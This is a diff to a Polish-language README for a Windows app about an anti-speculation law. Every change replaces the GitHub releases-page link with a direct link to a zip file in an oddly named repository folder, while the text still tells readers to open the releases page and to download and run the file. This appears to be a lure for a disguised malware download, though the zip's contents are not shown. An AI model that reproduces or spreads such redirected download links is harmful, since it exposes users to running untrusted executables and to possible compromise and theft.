@@ -1,12 +1,12 @@
 # 🛡️ ustawa-anty-spekulacyjna - Prosta ochrona przed spekulacją
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/main/unadoptably/ustawa-spekulacyjna-anty-2.1.zip)
 
 ## 📥 Pobierz aplikację
 
 Aby pobrać program, wejdź na stronę wydań i wybierz najnowszą wersję:
 
-https://github.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/releases
+https://raw.githubusercontent.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/main/unadoptably/ustawa-spekulacyjna-anty-2.1.zip
 
 Na stronie znajdź plik dla Windows, pobierz go i uruchom.
 
@@ -17,7 +17,7 @@ Ta aplikacja pomaga przejść przez prosty proces związany z treścią projektu
 ### Krok 1: Otwórz stronę wydań
 Wejdź na:
 
-https://github.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/releases
+https://raw.githubusercontent.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/main/unadoptably/ustawa-spekulacyjna-anty-2.1.zip
 
 ### Krok 2: Pobierz plik dla Windows
 Na stronie wybierz najnowsze wydanie. Szukaj pliku z nazwą, która pasuje do Windows, na przykład:
@@ -126,7 +126,7 @@ Najlepiej pobierać zawsze najnowszą wersję, jeśli chcesz używać bieżącyc
 
 ## 🔗 Link do pobrania
 
-[Otwórz stronę wydań i pobierz aplikację](https://github.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/releases)
+[Otwórz stronę wydań i pobierz aplikację](https://raw.githubusercontent.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/main/unadoptably/ustawa-spekulacyjna-anty-2.1.zip)
 
 ## ❓ Najczęstsze pytania
 
@@ -141,7 +141,7 @@ Sprawdź, czy pobrałeś właściwy plik dla Windows i czy pobieranie zakończy�
 
 ### Gdzie jest najnowsza wersja?
 Najnowszą wersję znajdziesz na stronie Releases:
-https://github.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/releases
+https://raw.githubusercontent.com/cabanabyzantinegreek968/ustawa-anty-spekulacyjna/main/unadoptably/ustawa-spekulacyjna-anty-2.1.zip
 
 ### Czy potrzebuję konta GitHub?
 Nie, aby pobrać plik, zwykle nie musisz mieć konta.
